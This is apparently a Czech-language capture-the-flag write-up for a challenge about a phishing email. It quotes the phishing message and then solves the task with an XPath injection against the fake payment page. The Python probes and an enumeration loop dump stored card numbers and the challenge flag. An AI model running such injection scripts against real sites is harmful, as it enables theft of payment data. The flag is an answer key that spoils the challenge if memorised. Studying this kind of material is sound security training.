# Fraudulent e-mail

## Zadání

```
Hi, packet inspector,

we have a apparently problem with some fraudulent payment gateway (see forwarded e-mail). We suspect that many of our customers have come across this scam.

Identify all card numbers entered into the fraudulent webpage (we have to report incident and its details to CSIRT-TCC).

Download fraudulent e-mail (MD5 checksum 94c7696bed436cd63a490de4008d2022).

May the Packet be with you!
```

Email:

```
MIME-Version: 1.0
Date: Mon, 10 Oct 2022 12:39:49 +0200
From: "Boss" <boss@mysterious-delivery.thecatch.cz>
Subject: Fwd: Unpaid invoice
To: "catcher@mysterious-delivery.thecatch.cz" <catcher@mysterious-delivery.thecatch.cz>
Content-Type: text/html; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

I need to pay it but it's not working!!!<br>
<br>
Boss<br>
<br>
Sent from my CatcherPaw<br>
<br>
---------- Forwarded message ---------<br>
From: Your Mysterious-Delivery Server Admin <admin@mysteriuos-delivery.thecatch.cz><br>
Date: Mon, 10 Oct 2022 12:00:00 +0200<br>
Subject: Unpaid invoice<br>
To: boss@mysterious-delivery.thecatch.cz <boss@mysterious-delivery.thecatch.cz><br>
<br>
Dear Client<br>
<br>
Unfortunately, we have not received payment for your last invoice from you.<br>
Would you please pay the amount due now via our payment gateway.<br>
<br>
Please use the link <a href="http://really.sneaky.phishing.thecatch.cz/?click=sjlk2fgj3oiervAnjkufho3uiKrmsd5xmoudfFdfDkrEn5ers4gj2nf35jvVxKdfjbq24weqfoeire24ge8">http://messenger-portal.mysterious-delivery.thecatch.cz</a> to complete payment.<br>
<br>
Should we not receive payment from you within the next two days, your server will be locked until payment has reached us.<br>
<br>
Best regards<br>
<br>
Mysterious-Delivery Server Admin
```

## Řešení

Stránka http://really.sneaky.phishing.thecatch.cz/ zobrazí "platební bránu", která posíla POST request data, například:

```python
data = {
'card-holder-name': 'Jmeno',
'card-number': "4556132988899614",
'card-expires-date': '02/2022',
'card-cvv': 123,
'proceed-to-pay': '',
}
```

### 1. Testy

Testování citlivosti vstupů na různé znaky odhalí, že parametr `card-number` ohlásí chybu při použití uvozovky `"`:

```python
data['card-number'] = '"'
r = requests.post('http://really.sneaky.phishing.thecatch.cz/', data = data)
print(r.text)
```

```
<b>Warning</b>:  SimpleXMLElement::xpath(): Unfinished literal in <b>/var/www/html/index.php</b> on line <b>82</b><br />
```

Dle chybové hlášky by se mohlo jednat o XPATH injection (https://book.hacktricks.xyz/pentesting-web/xpath-injection)

Zajimavý výsledek získáme:

```python
data['card-number'] = "1 or position()=1"
r = requests.post('http://really.sneaky.phishing.thecatch.cz/', data = data)
print(r.text)
```

Výstup

```
...
<p>This card <strong>4556-1329-8889-9614</strong> is broken.</p>
```

Ve výstupu se objevilo číslo nějaké karty! Zkusíme tedy vypsat všechny karty a uvídíme jestli mezi nimi bude i vlajka.

### 2. Program pro výpis vlajky

```python
import requests
import re

data = {
'card-holder-name': 'as',
'card-expires-date': '02/2022',
'card-cvv': 123,
'proceed-to-pay': '',
}

i = 1
while True:
    data['card-number'] = "1 or position()=%i" % i
    r = requests.post('http://really.sneaky.phishing.thecatch.cz/', data = data)
    m = re.search(r'This card <strong>(.*)<\/strong>', r.text)
    if m == None:
        break
    out = m.group(1)
    print(out)
    if 'FLAG' in out:
        break
    i += 1
```

Výstup:

```
...
3763-4282-5926-704
4485-4387-3632-9762
FLAG{0BF0-RREd-vAK3-1Ayi}
```

### Vlajka

```
FLAG{0BF0-RREd-vAK3-1Ayi}
```
